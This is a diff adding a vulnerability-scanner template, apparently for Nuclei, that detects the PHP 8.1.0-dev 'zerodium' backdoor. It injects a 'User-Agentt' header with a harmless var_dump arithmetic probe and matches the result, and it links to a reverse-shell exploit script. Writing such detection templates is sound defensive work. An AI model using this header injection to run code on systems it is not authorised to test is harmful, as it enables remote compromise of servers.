@@ -1,0 +1,32 @@
+http:
+    - headers:
+        User-Agentt: zerodiumvar_dump(233333*333332);
+      matchers:
+        - part: body
+          type: word
+          words:
+            - int(77777355556)
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}'
+id: php-zerodium-backdoor-rce
+info:
+    author: dhiyaneshDk
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        PHP 8.1.0-dev contains a backdoor dubbed 'zerodiumvar_dump' which can allow the execution of arbitrary PHP code.
+    metadata:
+        max-request: 1
+    name: PHP 8.1.0-dev - Backdoor Remote Code Execution
+    reference:
+        - https://news-web.php.net/php.internals/113838
+        - https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
+        - https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
+    severity: critical
+    tags:
+        - backdoor
+        - zerodium
